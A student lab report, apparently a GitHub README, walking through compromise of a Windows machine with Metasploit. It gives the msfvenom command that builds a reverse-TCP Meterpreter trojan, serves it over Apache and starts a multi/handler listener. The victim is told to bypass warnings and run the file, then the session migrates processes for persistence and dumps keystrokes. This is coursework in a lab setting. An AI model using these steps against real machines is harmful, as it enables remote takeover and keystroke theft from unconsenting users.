# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### NAME:SANJAY ASHWIN P
### REG NO:212223040181
# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT:
![WhatsApp Image 2024-11-01 at 17 31 18_5f9d2595](https://github.com/user-attachments/assets/a10d10df-1055-4c9e-b4e8-2cff6b62fdd7)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![WhatsApp Image 2024-11-01 at 17 43 49_799464eb](https://github.com/user-attachments/assets/b9dc914f-6c12-434d-a4ab-9263af9ef852)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![WhatsApp Image 2024-11-01 at 17 47 07_c6e7043b](https://github.com/user-attachments/assets/562aa67f-8d76-41f0-8add-8fb8cc2cf68a)


Start apache server
sudo systemctl apache2 start
## OUTPUT:
![WhatsApp Image 2024-11-01 at 17 49 53_b962cf8d](https://github.com/user-attachments/assets/4dd21c44-bf67-47b4-a8f2-90699d018eeb)

Check the status of apache2
## OUTPUT:
![WhatsApp Image 2024-11-01 at 17 50 49_8e5f64c2](https://github.com/user-attachments/assets/49764b81-d94c-4ea1-abc4-8c91bb8bb906)

Invoke msfconsole:
## OUTPUT:
![WhatsApp Image 2024-11-01 at 17 56 44_14e8711a](https://github.com/user-attachments/assets/2207bcbb-ee1e-4c2a-a4d9-8f44fd5d48be)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![WhatsApp Image 2024-11-01 at 17 57 24_7438089c](https://github.com/user-attachments/assets/35e68da2-d561-49ec-9f6f-ca9ea8a49997)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![WhatsApp Image 2024-11-01 at 18 01 15_ea1edaed](https://github.com/user-attachments/assets/cdb145a9-a1d0-4f24-8605-5e76d7689d44)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![image](https://github.com/user-attachments/assets/1de09061-e779-4139-b93c-7a990bb402a8)

Bypass any warning boxes, double-click the file, and allow it to run.

![image](https://github.com/user-attachments/assets/a517238b-a224-40d6-93ca-f2efed2c75b2)

On kali give the command exploit

![WhatsApp Image 2024-11-01 at 18 12 04_448ad010](https://github.com/user-attachments/assets/01044599-fd74-433d-ba7a-a96a45e2b164)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![WhatsApp Image 2024-11-01 at 18 12 46_ee3b1ab9](https://github.com/user-attachments/assets/0362e76b-955b-46e4-a561-584b86e29192)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:
migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/user-attachments/assets/4341677e-a58c-483f-af17-c58e6b61c58b)


Post Exploitation
keyscan_dump	Shows the keystrokes captured so far

![WhatsApp Image 2024-11-01 at 18 15 09_3e278d2d](https://github.com/user-attachments/assets/5ba20273-6a12-499d-8338-c0b183df5d62)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
